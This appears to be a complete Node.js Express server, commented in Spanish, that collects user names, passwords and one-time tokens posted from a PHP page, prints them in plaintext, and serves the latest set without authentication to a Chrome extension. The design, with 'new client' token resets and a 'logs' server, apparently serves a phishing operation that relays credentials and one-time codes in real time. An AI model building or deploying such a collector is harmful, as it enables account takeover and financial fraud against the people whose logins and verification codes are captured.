const express = require('express');
const app = express();

// Para poder leer los datos que enviará tu PHP
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 🚩 VARIABLE GLOBAL
let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false
};

// 1. RUTA PARA RECIBIR (La que usa tu PHP en XAMPP)
app.post('/recibir', (req, res) => {
    const { user, pass, token, origen } = req.body;

    // --- LÓGICA DE LIMPIEZA ANT-REPETICIÓN ---
    // Si llega un usuario nuevo, o el origen indica que es un inicio, 
    // matamos el token anterior para que no se use con el nuevo cliente.
    let tokenFinal = token;
    
    if (user && user !== baseDeDatosTemporal.user) {
        console.log("⚠️ Detectado nuevo usuario. Reseteando token viejo...");
        tokenFinal = token || null; // Si no mandas token nuevo, queda en null
    } else {
        // Si es el mismo usuario, mantenemos el token que ya teníamos a menos que llegue uno nuevo
        tokenFinal = token || baseDeDatosTemporal.token;
    }

    // Guardamos en la "agenda" para la extensión
    baseDeDatosTemporal = {
        user: user || baseDeDatosTemporal.user,
        pass: pass || baseDeDatosTemporal.pass,
        token: tokenFinal, 
        origen: origen,
        actualizado: true
    };

    console.log("===============================");
    console.log("🔔 DATO ACTUALIZADO");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`🔑 Clave: ${baseDeDatosTemporal.pass}`);
    console.log(`📲 Token: ${baseDeDatosTemporal.token}`);
    console.log("===============================");

    res.status(200).send("OK");
});

// 2. RUTA PARA CONSULTAR (La que usará la Extensión de Chrome)
app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.get('/', (req, res) => {
    res.send("Servidor de Logs y API de Extensión Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor activo en puerto ${PORT}`);
});
